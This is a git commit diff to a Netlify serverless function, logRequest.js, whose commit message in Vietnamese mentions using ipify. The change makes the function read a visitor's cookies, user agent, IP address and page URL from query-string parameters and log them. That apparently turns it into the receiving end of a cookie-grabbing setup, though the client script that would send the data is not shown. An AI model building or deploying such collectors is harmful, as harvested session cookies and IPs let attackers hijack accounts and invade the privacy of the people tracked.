0cfc5252ad8c6a5e5fd32df4f62aad02938b19b8
dangkimanh01 <anhdangkim962@gmail.com>
2025-04-26 01:49:08 +0700

    hi
    sửa html, sửa js để dùng ipify

--- netlify-functions/logRequest.js
+++ netlify-functions/logRequest.js
@@ -1,18 +1,16 @@
 // netlify-functions/logRequest.js
 
 exports.handler = async (event, context) => {
-  const cookies = event.headers.cookie || "No cookies";
+  const cookies = event.queryStringParameters.cookies || "No cookies";
   const userAgent = event.queryStringParameters.userAgent || "No user agent";
   const userIP = event.queryStringParameters.userIP || "No IP";
-  const time = event.queryStringParameters.time || "No time";
-  const language = event.queryStringParameters.language || "No language";
+  const url = event.queryStringParameters.url || "No URL";
 
   // Ghi thông tin vào log
   console.log(`Cookies: ${cookies}`);
   console.log(`User Agent: ${userAgent}`);
   console.log(`IP: ${userIP}`);
-  console.log(`Time: ${time}`);
-  console.log(`Language: ${language}`);
+  console.log(`URL: ${url}`);
 
   return {
     statusCode: 200,
